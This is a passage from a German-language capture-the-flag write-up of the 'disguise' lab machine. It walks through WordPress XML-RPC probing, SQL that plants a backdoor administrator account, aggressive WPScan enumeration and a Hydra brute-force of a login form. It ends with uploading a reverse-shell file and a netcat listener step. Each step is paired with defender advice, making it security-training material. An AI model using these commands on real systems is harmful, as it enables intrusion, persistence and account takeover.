            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit dem nun bekannten Passwort `password` sollte der Login über `wp-login.php` oder direkt in das Admin-Panel möglich sein.<br><strong>Empfehlung (Admin):</strong> Wie oben: Starke Passwörter, 2FA und Limitierung von Login-Versuchen sind essenziell.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nano verify.xml</span></div>
                    <pre>
[Inhalt von verify.xml nicht gezeigt, aber es wird eine XML-Struktur für einen XML-RPC-Aufruf erwartet]
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -v -X POST -H "Content-Type: text/xml" --data @verify.xml http://disguise.hmv/xmlrpc.php</span></div>
                    <pre>
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host disguise.hmv:80 was resolved.
* IPv6: (none)
* IPv4: 192.168.2.189
*   Trying 192.168.2.189:80...
* <span class="password">Connected to disguise.hmv (192.168.2.189) port 80</span>
* using HTTP/1.x
&gt; POST /xmlrpc.php HTTP/1.1
&gt; Host: disguise.hmv
&gt; User-Agent: curl/8.13.0
&gt; Accept: */*
&gt; Content-Type: text/xml
&gt; Content-Length: 239
&gt; 
* upload completely sent off: 239 bytes
&lt; <span class="password">HTTP/1.1 200 OK</span>
&lt; Date: Sat, 03 May 2025 22:43:11 GMT
&lt; Server: Apache/2.4.59 (Debian)
&lt; Connection: close
&lt; Vary: Accept-Encoding
&lt; Content-Length: 403
&lt; Content-Type: text/xml; charset=UTF-8
&lt; 
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;methodResponse&gt;
  &lt;fault&gt;
    &lt;value&gt;
      &lt;struct&gt;
        &lt;member&gt;
          &lt;name&gt;faultCode&lt;/name&gt;
          &lt;value&gt;&lt;int&gt;-32700&lt;/int&gt;&lt;/value&gt;
        &lt;/member&gt;
        &lt;member&gt;
          &lt;name&gt;faultString&lt;/name&gt;
          &lt;value&gt;&lt;string&gt;<span class="password">parse error. not well formed</span>&lt;/string&gt;&lt;/value&gt;
        &lt;/member&gt;
      &lt;/struct&gt;
    &lt;/value&gt;
  &lt;/fault&gt;
&lt;/methodResponse&gt;
* shutting down connection #0
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Hier wird versucht, eine manuelle XML-RPC-Anfrage an `http://disguise.hmv/xmlrpc.php` zu senden.
                <ul>
                    <li><code>nano verify.xml</code>: Erstellt oder bearbeitet eine Datei namens `verify.xml`. Der Inhalt dieser Datei wird der XML-Payload für die Anfrage sein.</li>
                    <li><code>curl -v -X POST -H "Content-Type: text/xml" --data @verify.xml ...</code>: Sendet den Inhalt von `verify.xml` als POST-Request mit dem Content-Type `text/xml`.</li>
                </ul>
                Die Antwort vom Server ist ein XML-RPC-Fehler: `faultCode -32700` mit `faultString "parse error. not well formed"`. Dies bedeutet, dass der Server die gesendete XML-Nachricht nicht verarbeiten konnte, weil sie syntaktisch fehlerhaft war.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Versuch, manuell mit der XML-RPC-Schnittstelle zu interagieren, ist fehlgeschlagen, weil die XML-Anfrage in `verify.xml` nicht korrekt formatiert war. Dies kann passieren, wenn die XML-Struktur, Methodennamen oder Parameter nicht den Erwartungen der WordPress XML-RPC-Implementierung entsprechen. Da das Passwort bereits bekannt ist, ist dieser spezielle manuelle Versuch möglicherweise nicht mehr notwendig, es sei denn, es sollen andere XML-RPC-Methoden getestet werden.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn weiterhin manuelle XML-RPC-Aufrufe erforderlich sind, stellen Sie sicher, dass die XML-Payloads korrekt formatiert sind. Verwenden Sie Beispiele aus der WordPress-Dokumentation oder von erfolgreichen WPScan-Anfragen als Vorlage. Konzentrieren Sie sich jedoch primär auf den Login mit den bekannten Zugangsdaten und die Ausnutzung der Theme-Schwachstelle.<br><strong>Empfehlung (Admin):</strong> Wenn XML-RPC nicht benötigt wird, deaktivieren Sie es, um die Angriffsfläche zu reduzieren. Wenn es benötigt wird, stellen Sie sicher, dass es auf dem neuesten Stand ist und überwachen Sie die Logs auf verdächtige Aktivitäten.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
-- 1. Benutzer in die Tabelle wp_users einfügen
--    (Username: 'neuer_admin', Passwort-Hash: MD5 von 'StarkesPasswort123!')
INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) 
VALUES ('neuer_admin', 'b1f313d0876b019e16750a64021c127a', 'neueradmin', 'email@example.com', NOW(), 'Neuer Admin'); 

-- 2. Die ID des gerade erstellten Benutzers holen
SET @user_id = LAST_INSERT_ID();

-- 3. Benutzer-Metadaten hinzufügen, um ihn zum Administrator zu machen 
--    (meta_key verwendet den korrekten Präfix 'wp_')
INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
VALUES (@user_id, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');

-- 4. Das User-Level setzen (meta_key verwendet den korrekten Präfix 'wp_')
INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
VALUES (@user_id, 'wp_user_level', '10'); 

-- MySQL-Konsole verlassen
EXIT;

Zusammenfassung:

Führe zuerst den mysql Befehl in deinem Terminal aus. Gib das Passwort ein, wenn nötig (hier ist es direkt im Befehl enthalten). Dann kopiere den gesamten SQL-Block (von INSERT INTO wp_users... bis VALUES (@user_id, 'wp_user_level', '10');) und füge ihn in die MySQL-Konsole ein und drücke Enter. Schließe die Konsole mit EXIT;.

Danach kannst du zu http://disguise.hmv/wp-login.php gehen und dich mit:

    Benutzername: neuer_admin

    Passwort: StarkesPasswort123!

anmelden. WordPress sollte den MD5-Hash beim ersten Login erkennen und in sein eigenes Format umwandeln.

######################################################################################################################################

<span class="prompt">root@disguise:~# </span><span class="command">mysql -u wpuser -p'Str0ngPassw0d1!!!' -h localhost -D wordpress</span>
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 104
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">-- 1. Benutzer in die Tabelle wp_users einfügen</span>
<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">--    (Username: 'neuer_admin', Passwort-Hash: MD5 von 'StarkesPasswort123!')</span>
<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, display_name)</span> 
    -&gt; <span class="command">VALUES ('neuer_admin', 'b1f313d0876b019e16750a64021c127a', 'neueradmin', 'email@example.com', NOW(), 'Neuer Admin');</span> 
<span class="password">Query OK, 1 row affected (0.001 sec)</span>

<span class="prompt">MariaDB [wordpress]&gt; </span>
<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">-- 2. Die ID des gerade erstellten Benutzers holen</span>
<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">SET @user_id = LAST_INSERT_ID();</span>
<span class="password">Query OK, 0 rows affected (0.000 sec)</span>

<span class="prompt">MariaDB [wordpress]&gt; </span>
<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">-- 3. Benutzer-Metadaten hinzufügen, um ihn zum Administrator zu machen</span> 
<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">--    (meta_key verwendet den korrekten Präfix 'wp_')</span>
<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">INSERT INTO wp_usermeta (user_id, meta_key, meta_value)</span> 
    -&gt; <span class="command">VALUES (@user_id, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');</span>
<span class="password">Query OK, 1 row affected (0.001 sec)</span>

<span class="prompt">MariaDB [wordpress]&gt; </span>
<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">-- 4. Das User-Level setzen (meta_key verwendet den korrekten Präfix 'wp_')</span>
<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">INSERT INTO wp_usermeta (user_id, meta_key, meta_value)</span> 
    -&gt; <span class="command">VALUES (@user_id, 'wp_user_level', '10');</span> 
<span class="password">Query OK, 1 row affected (0.002 sec)</span>

<span class="prompt">MariaDB [wordpress]&gt; </span>
<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">-- MySQL-Konsole verlassen</span>
<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">EXIT;</span>
Bye
<span class="prompt">root@disguise:~# </span><span class="command">php -r 'include "/var/www/html/wp-load.php"; echo wp_hash_password("StarkesPasswort123!");'</span> 
<span class="password">$wp$2y$10$.yux4qR2GnnmoC4Qz1ZrxurBvME84Nhfb3P1.V.QQa.28m1DUhVCq</span>root@disguise:~# -- *** UNBEDINGT ANPASSEN: Den Hash aus dem PHP-Befehl einfügen! ***
<span class="password">-bash: --: command not found</span>
<span class="prompt">root@disguise:~# </span><span class="command">UPDATE wp_users SET user_pass = 'HIER_DEN_PHP_GENERATED_HASH_EINFÜGEN' WHERE user_login = 'neuer_admin';</span>
<span class="password">-bash: UPDATE: command not found</span>
<span class="prompt">root@disguise:~# </span><span class="command">EXIT;</span>
<span class="password">-bash: EXIT: command not found</span>
<span class="prompt">root@disguise:~# </span><span class="command">UPDATE wp_users SET user_pass = 'HIER_DEN_PHP_GENERATED_HASH_EINFÜGEN' WHERE user_login = 'neuer_admin';^C</span>
<span class="prompt">root@disguise:~# </span><span class="command">mysql -u wpuser -p'Str0ngPassw0d1!!!' -h localhost -D wordpress</span>
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 110
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

<span class="prompt">MariaDB [wordpress]&gt; </span><span class="command">UPDATE wp_users SET user_pass = '$wp$2y$10$.yux4qR2GnnmoC4Qz1ZrxurBvME84Nhfb3P1.V.QQa.28m1DUhVCq' WHERE user_login = 'neuer_admin';</span>
<span class="password">Query OK, 1 row affected (0.001 sec)</span>
Rows matched: 1  Changed: 1  Warnings: 0

<span class="prompt">MariaDB [wordpress]&gt; </span>Bye
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt zeigt eine Methode, um einen neuen Administratorbenutzer direkt in der WordPress-Datenbank zu erstellen, falls man bereits Root-Zugriff auf dem Server oder direkten Datenbankzugriff mit ausreichenden Rechten hat. Der obere Teil des Textes scheint eine Anleitung zu sein, gefolgt von der tatsächlichen Ausführung auf dem Zielsystem (erkennbar am Prompt `root@disguise:~#`).
                Schritte:
                <ol>
                    <li>Verbindung zur WordPress-Datenbank (`wordpress`) als Benutzer `wpuser` mit dem Passwort `Str0ngPassw0d1!!!`.</li>
                    <li>Einfügen eines neuen Benutzers `neuer_admin` mit einem MD5-Hash (`b1f313d0876b019e16750a64021c127a`) des Passworts "StarkesPasswort123!".</li>
                    <li>Zuweisen von Administratorrechten (`wp_capabilities`) und User-Level 10 zu diesem neuen Benutzer.</li>
                    <li>Anschließend wird versucht, das Passwort des neuen Benutzers mit einem von WordPress korrekt gehashten Passwort (generiert via `php -r '... wp_hash_password(...);'`) zu aktualisieren. Zuerst schlagen die `UPDATE`-Befehle fehl, da sie direkt in der Bash-Shell und nicht in der MySQL-Konsole eingegeben werden.</li>
                    <li>Schließlich wird der `UPDATE`-Befehl korrekt in der MySQL-Konsole ausgeführt, um den Passwort-Hash des Benutzers `neuer_admin` auf den mit `wp_hash_password` generierten Wert `$wp$2y$10$.yux4qR2GnnmoC4Qz1ZrxurBvME84Nhfb3P1.V.QQa.28m1DUhVCq` zu setzen.</li>
                </ol>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine Post-Exploitation-Technik, um Persistenz oder einen alternativen Admin-Zugang zu WordPress zu erlangen, *nachdem* bereits ein signifikanter Zugriff auf das System (hier als `root` auf der Maschine `disguise` oder zumindest direkter Datenbankzugriff) besteht. Die Verwendung eines MD5-Hashes ist veraltet; WordPress verwendet standardmäßig stärkere phpass-Hashes. Der Schritt, den Hash später mit `wp_hash_password` zu aktualisieren, ist korrekt, um Kompatibilität zu gewährleisten. Die anfänglichen `bash: command not found`-Fehler zeigen, dass der Benutzer die SQL-Befehle fälschlicherweise in der Bash-Shell statt in der MariaDB-Konsole ausführen wollte.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn Root-Zugriff auf dem Server erlangt wurde, ist das direkte Hinzufügen eines WordPress-Admins eine effektive Methode, um die Kontrolle über die Webanwendung zu erlangen oder zu festigen. Es ist wichtig, die korrekte Hashing-Methode von WordPress zu verwenden, um sicherzustellen, dass der Login funktioniert. Diese Methode ist jedoch meist ein Schritt nach dem initialen Zugriff und der Privilegienerweiterung.<br><strong>Empfehlung (Admin):</strong> Sichern Sie den Zugriff auf Ihre Datenbankserver rigoros. Verwenden Sie starke, einzigartige Passwörter für Datenbankbenutzer und beschränken Sie deren Berechtigungen auf das absolut Notwendige. Überwachen Sie Datenbanklogs auf ungewöhnliche Aktivitäten. Sichern Sie den Root-Zugriff auf Ihre Server. Wenn ein solcher unbefugter Zugriff erfolgt ist, sollte das gesamte System als kompromittiert betrachtet und eine vollständige Untersuchung sowie Neuinstallation in Betracht gezogen werden.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
wpscan --url http://disguise.hmv/ \
       --api-token RoBoAaM72LLsihOlqUJrA1EleT6AJAd9QxQ9rbmQNCY \
       --enumerate u,ap,at,tt,cb,m \
       --plugins-detection aggressive \
       --themes-detection aggressive \
       --plugins-version-detection aggressive \
       --themes-version-detection aggressive \
       --detection-mode aggressive \
       --random-user-agent \
       --output wpscan_all_plugins_themes_scan_disguise.txt 
                    </pre>
                </div>
            </div>
             <p class="analysis"><strong>Analyse:</strong> Dies ist ein weiterer geplanter WPScan-Befehl, der jedoch in diesem Log nicht ausgeführt zu werden scheint (es folgt keine Ausgabe des Scans). Er ist deutlich aggressiver und umfassender als die vorherigen.
                <ul>
                    <li><code>--enumerate u,ap,at,tt,cb,m</code>: Enumeriert Benutzer (`u`), alle Plugins (`ap`), alle Themes (`at`), Timthumbs (`tt`), Config Backups (`cb`), und Medias (`m`).</li>
                    <li><code>--plugins-detection aggressive</code>, <code>--themes-detection aggressive</code>, <code>--plugins-version-detection aggressive</code>, <code>--themes-version-detection aggressive</code>: Erzwingt aggressive Methoden zur Erkennung und Versionsbestimmung von Plugins und Themes.</li>
                    <li><code>--detection-mode aggressive</code>: Stellt den allgemeinen Erkennungsmodus auf aggressiv.</li>
                    <li><code>--random-user-agent</code>: Verwendet zufällige User-Agents, um eine Erkennung durch WAFs oder Log-Analyse zu erschweren.</li>
                    <li><code>--output wpscan_all_plugins_themes_scan_disguise.txt</code>: Speichert die Ausgabe in einer Datei.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Ein solcher aggressiver Scan kann sehr viele Informationen liefern, aber auch sehr zeitaufwendig sein und viel "Lärm" auf dem Zielsystem und in den Logs erzeugen. Die Option `--force` (die im nächsten Befehl verwendet wird, aber hier nicht) würde WPScan zwingen, auch bei einer erkannten WAF weiterzumachen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser Scan ist sinnvoll, wenn eine tiefgehende Analyse der WordPress-Instanz erforderlich ist und Zeit keine kritische Rolle spielt. Die Ausgabe in eine Datei zu speichern ist eine gute Praxis für spätere Analysen. Es ist jedoch wichtig, die Auswirkungen eines solch aggressiven Scans auf das Zielsystem und mögliche Entdeckungsrisiken abzuwägen.<br><strong>Empfehlung (Admin):</strong> Eine Web Application Firewall (WAF) und ein Intrusion Detection/Prevention System (IDS/IPS) können helfen, solch aggressive Scans zu erkennen und zu blockieren. Regelmäßige Log-Analyse ist wichtig, um verdächtige Aktivitäten zu identifizieren.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">wpscan --url http://disguise.hmv/ \
       --api-token RoBoAaM72LLsihOlqUJrA1EleT6AJAd9QxQ9rbmQNCY \
       --enumerate u,p,t,tt,cb,m \
       --plugins-detection aggressive \
       --themes-detection aggressive \
       --plugins-version-detection aggressive \
       --themes-version-detection aggressive \
       --detection-mode aggressive \
       --random-user-agent \
       --force</span></div>
                    <pre>
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - [Link: https://automattic.com/ | Ziel: https://automattic.com/]
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://disguise.hmv/ [192.168.2.190] <!-- IP-Adresse hat sich geändert zu .190 -->
[+] Started: Sun May  4 01:35:32 2025

Interesting Finding(s):
[...]
[+] WordPress version <span class="command">6.8.1</span> identified (Latest, released on 2025-04-30).
[...]
[i] The main theme could not be detected. <!-- Unterschied zum vorherigen Scan -->

[+] Enumerating Most Popular Plugins (via Aggressive Methods)
[...]
[i] Plugin(s) Identified:

[+] <span class="command">akismet</span>
 | Location: http://disguise.hmv/wp-content/plugins/akismet/
 | Latest Version: 5.3.7
 [...]
 | <span class="password">[!] 1 vulnerability identified:</span>
 |
 | <span class="password">[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)</span>
 |     Fixed in: 3.1.5
 [...]
 | The version could not be determined.

[+] Enumerating Most Popular Themes (via Aggressive Methods)
[...]
[i] Theme(s) Identified:

[+] <span class="command">newsblogger</span>
 | Location: http://disguise.hmv/wp-content/themes/newsblogger/
 [...]
 | <span class="password">[!] 2 vulnerabilities identified:</span>
 |
 | <span class="password">[!] Title: NewsBlogger &lt; 0.2.5.5 - Cross-Site Request Forgery to Arbitrary Plugin Installation</span>
 |     Fixed in: 0.2.5.5
 [...]
 | <span class="password">[!] Title: NewsBlogger &lt; 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload</span>
 |     Fixed in: 0.2.5.2
 [...]
 | The version could not be determined. <!-- Unterschied zum vorherigen Scan, wo Version 0.2.5.1 gefunden wurde -->

[+] <span class="command">newscrunch</span>
 | Location: http://disguise.hmv/wp-content/themes/newscrunch/
 [...]
 | <span class="password">[!] 2 vulnerabilities identified:</span>
 |
 | <span class="password">[!] Title: Newscrunch &lt; 1.8.4.1 - Cross-Site Request Forgery to Arbitrary File Upload</span>
 |     Fixed in: 1.8.4.1
 [...]
 | <span class="password">[!] Title: Newscrunch &lt; 1.8.4.1 - Authenticated (Subscriber+) Arbitrary File Upload</span>
 |     Fixed in: 1.8.4.1
 [...]
 | The version could not be determined. <!-- Unterschied zum vorherigen Scan, wo Version 1.8.4.2 gefunden wurde -->

[+] <span class="command">twentytwentyfive</span>, <span class="command">twentytwentyfour</span>, <span class="command">twentytwentythree</span> (Standard-Themes, Versionen nicht bestimmt, aber aufgelistet)
[...]
[+] Enumerating Users (via Aggressive Methods)
[...]
[i] User(s) Identified:

[+] <span class="command">simpleadmin</span>
[+] <span class="command">simpleAdmin</span>
[+] <span class="command">neueradmin</span> <!-- Dieser Benutzer wurde zuvor manuell in der Datenbank erstellt -->
[...]
[+] Finished: Sun May  4 01:36:06 2025
[...]
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dieser WPScan-Lauf ist dem zuvor geplanten sehr ähnlich, verwendet aber `u,p,t` (Benutzer, Plugins, Themes) statt `u,ap,at` für die Enumeration und fügt die Option `--force` hinzu. Auffällig ist, dass die Ziel-IP nun als `192.168.2.190` angezeigt wird, während sie zuvor `192.168.2.189` war. Dies könnte ein Tippfehler im Log, eine Änderung der IP des Ziels oder ein Scan gegen ein anderes, ähnliches Ziel sein. Für die weitere Analyse wird von `192.168.2.189` ausgegangen, es sei denn, es gibt explizite Hinweise auf eine IP-Änderung.
                Wichtige Ergebnisse dieses Scans:
                <ul>
                    <li>WordPress Version 6.8.1 bestätigt.</li>
                    <li>Das Haupttheme konnte diesmal nicht erkannt werden.</li>
                    <li>Plugin "akismet" gefunden, Version nicht bestimmbar, aber eine alte XSS-Schwachstelle (für Versionen 2.5.0-3.1.4) wird gemeldet.</li>
                    <li>Theme "newsblogger" wieder gefunden, aber diesmal konnte die Version nicht bestimmt werden. Die bekannten Schwachstellen (CSRF zu Plugin Installation und Authenticated Arbitrary File Upload) werden erneut gelistet.</li>
                    <li>Theme "newscrunch" ebenfalls gefunden, Version nicht bestimmbar. WPScan meldet nun auch hier zwei Schwachstellen:
                        <ul>
                            <li>**Newscrunch &lt; 1.8.4.1 - Cross-Site Request Forgery to Arbitrary File Upload (CVE-2025-1306)**</li>
                            <li>**Newscrunch &lt; 1.8.4.1 - Authenticated (Subscriber+) Arbitrary File Upload (CVE-2025-1307)**</li>
                        </ul>
                    Dies sind neue, kritische Informationen, falls dieses Theme aktiv ist und die Version betroffen ist.
                    </li>
                    <li>Standard-Themes (twentytwentyfive, etc.) wurden enumeriert.</li>
                    <li>Benutzer "simpleadmin", "simpleAdmin" und der manuell erstellte "neueradmin" wurden gefunden.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Dieser aggressivere Scan hat zusätzliche, potenziell kritische Schwachstellen für das "newscrunch"-Theme aufgedeckt, ähnlich denen des "newsblogger"-Themes. Die Unstimmigkeit bei der Versionserkennung der Themes im Vergleich zum vorherigen Scan ist bemerkenswert. Die Entdeckung des "akismet"-Plugins mit einer alten Schwachstelle ist weniger kritisch, da XSS oft weitere Bedingungen erfordert. Die Enumeration von "neueradmin" bestätigt dessen Existenz in der Datenbank.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Priorisieren Sie die Schwachstellen im "newsblogger"- und "newscrunch"-Theme (Authenticated Arbitrary File Upload). Da das Passwort für "simpleadmin" bekannt ist (`password`), versuchen Sie sich einzuloggen und zu bestimmen, welches Theme aktiv ist und ob die Version anfällig ist. Wenn ja, versuchen Sie, eine Webshell über die Arbitrary File Upload-Schwachstelle hochzuladen. Die XSS in Akismet kann als sekundärer Fund dokumentiert werden.<br><strong>Empfehlung (Admin):</strong> **Dringend alle Themes ("newsblogger", "newscrunch") und Plugins ("akismet") auf die neuesten Versionen aktualisieren oder deinstallieren, wenn sie nicht benötigt werden.** Überprüfen und bereinigen Sie Benutzerkonten; der "neueradmin"-Account sollte untersucht und entfernt werden, wenn er nicht legitim ist. Führen Sie eine vollständige Sicherheitsüberprüfung der WordPress-Instanz durch.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(pwn)─(root㉿cyber)-[~/Hackingtools/CVE-2025-1304]
└─# <span class="command">hydra -l simpleAdmin -P /usr/share/wordlists/rockyou.txt dark.disguise.hmv http-post-form "/login.php:username=^USER^&amp;password=^PASS^:用户名或密码不正确" -f -t 64</span></div>
                    <pre>
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-04 22:43:11
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344501 login tries (l:1/p:14344501), ~224133 tries per task
[DATA] attacking http-post-form://dark.disguise.hmv:80/login.php:username=^USER^&amp;password=^PASS^:用户名或密码不正确
<span class="password">[80][http-post-form] host: dark.disguise.hmv   login: simpleAdmin   password: Str0ngPassw0d1@@@</span>
[STATUS] attack finished for dark.disguise.hmv (valid pair found)
<span class="password">1 of 1 target successfully completed, 1 valid password found</span>
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-04 22:43:28
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dies ist ein Hydra Brute-Force-Angriff auf die Login-Seite (`/login.php`) der Subdomain `dark.disguise.hmv`.
                <ul>
                    <li><code>-l simpleAdmin</code>: Der zu testende Benutzername. Es ist wichtig zu beachten, dass dies derselbe Benutzername ist, der für die WordPress-Hauptseite gefunden wurde.</li>
                    <li><code>-P /usr/share/wordlists/rockyou.txt</code>: Die verwendete Passwortliste.</li>
                    <li><code>dark.disguise.hmv</code>: Das Ziel.</li>
                    <li><code>http-post-form "/login.php:username=^USER^&amp;password=^PASS^:用户名或密码不正确"</code>: Definiert den Login-Mechanismus und die Fehlererkennung. Die Fehlermeldung "用户名或密码不正确" (Benutzername oder Passwort ist falsch) wird verwendet, um erfolglose Versuche zu identifizieren.</li>
                    <li><code>-f</code>: Stoppt, sobald ein gültiges Passwort gefunden wird.</li>
                    <li><code>-t 64</code>: Verwendet 64 parallele Tasks, was sehr aggressiv ist.</li>
                </ul>
                **Erfolg!** Hydra hat das Passwort <span class="password">Str0ngPassw0d1@@@</span> für den Benutzer `simpleAdmin` auf der Seite `dark.disguise.hmv` gefunden.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> **Ein weiterer sehr wichtiger Durchbruch!** Der Zugriff auf die Anwendung unter `dark.disguise.hmv` wurde erlangt. Die Wiederverwendung des Benutzernamens "simpleAdmin" (oder einer Variation davon) und die Verwendung eines Passworts, das zwar komplexer aussieht, aber immer noch durch Brute-Force gefunden wurde, deuten auf Schwächen im Passwortmanagement oder in der Benutzerverwaltung hin. Die hohe Anzahl von Tasks (`-t 64`) hat den Prozess beschleunigt, kann aber auch zu Problemen auf dem Zielserver oder zur Entdeckung führen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melden Sie sich sofort mit den Zugangsdaten `simpleAdmin:Str0ngPassw0d1@@@` auf `http://dark.disguise.hmv/login.php` an. Untersuchen Sie die Funktionalität der Anwendung, insbesondere Bereiche, die nach dem Login zugänglich werden, wie die zuvor gesehene `profile.php` oder das `manager/`-Verzeichnis. Suchen Sie nach Datei-Upload-Möglichkeiten, SQL-Injection-Punkten oder anderen Schwachstellen, die zu Remote Code Execution führen könnten.<br><strong>Empfehlung (Admin):</strong> **Ändern Sie sofort das Passwort für den Benutzer "simpleAdmin" auf `dark.disguise.hmv` zu einem starken, einzigartigen Passwort!** Vermeiden Sie die Wiederverwendung von Benutzernamen und Passwörtern über verschiedene Systeme hinweg. Implementieren Sie Mechanismen zur Begrenzung von Anmeldeversuchen (Account Lockout) und erwägen Sie Zwei-Faktor-Authentifizierung, falls die Anwendung dies unterstützt. Führen Sie ein Audit der Benutzerkonten durch.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
http://dark.disguise.hmv/manager/
暗黑商店管理后台
返回个人中心 | 添加商品 | 退出
管理员控制台

欢迎使用管理后台
                    </pre>
                </div>
            </div>
            <img src="manager.jpg" alt="hier sieht man den inhalt vom verstecken pfad manager">
            <img src="manager_upload.jpg" alt="hier sieht man die uploadfunktion">
            <img src="test revshell_upload.jpg" alt="hier sieht man die uploaded revshell">
            <p class="analysis"><strong>Analyse:</strong> Diese Ausgabe zeigt den Inhalt der Seite `http://dark.disguise.hmv/manager/` nach erfolgreichem Login (vermutlich mit den zuvor gefundenen Zugangsdaten `simpleAdmin:Str0ngPassw0d1@@@`).
                Die Seite heißt "暗黑商店管理后台" (Dark Shop Management Backend). Sie bietet Links zu "返回个人中心" (Zurück zum persönlichen Zentrum), "添加商品" (Produkt hinzufügen) und "退出" (Logout). Der Hauptbereich begrüßt den Benutzer im "管理员控制台" (Administratorkonsole).
                Die eingefügten Bilder visualisieren dies:
                <ul>
                    <li>`manager.jpg`: Zeigt vermutlich die Hauptseite des Manager-Bereichs.</li>
                    <li>`manager_upload.jpg`: Zeigt eine Datei-Upload-Funktion, wahrscheinlich im Kontext des Hinzufügens von Produkten (z.B. Produktbilder).</li>
                    <li>`test revshell_upload.jpg`: Zeigt, dass eine Datei, die vermutlich eine Reverse Shell enthält ("test revshell"), erfolgreich hochgeladen wurde.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> **Dies ist der Weg zur Remote Code Execution (RCE)!** Die Entdeckung einer Datei-Upload-Funktion in einem administrativen Backend ist ein klassischer Angriffsvektor. Wenn die Anwendung den Dateityp oder Inhalt der hochgeladenen Dateien nicht ausreichend validiert, können Angreifer bösartige Skripte (z.B. Webshells in PHP) hochladen und diese dann über den Webserver ausführen. Das Bild `test revshell_upload.jpg` bestätigt, dass dieser Upload-Versuch erfolgreich war.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem die Webshell (z.B. `test_revshell.php`) hochgeladen wurde:
                <ol>
                    <li>Finden Sie den genauen Pfad heraus, unter dem die hochgeladene Datei über den Webbrowser erreichbar ist (oft in einem Upload-Verzeichnis wie `/images/`, `/uploads/` oder einem produktspezifischen Pfad).</li>
                    <li>Rufen Sie die Webshell im Browser auf, um die Codeausführung zu triggern. Wenn es eine Reverse Shell ist, stellen Sie sicher, dass ein Listener (z.B. `nc -lvnp PORT`) auf Ihrem Angreifer-Rechner läuft.</li>
                    <li>Sobald die Reverse Shell verbunden ist, haben Sie Kommandozeilenzugriff auf den Server im Kontext des Webserver-Benutzers (wahrscheinlich `www-data`).</li>
                </ol>
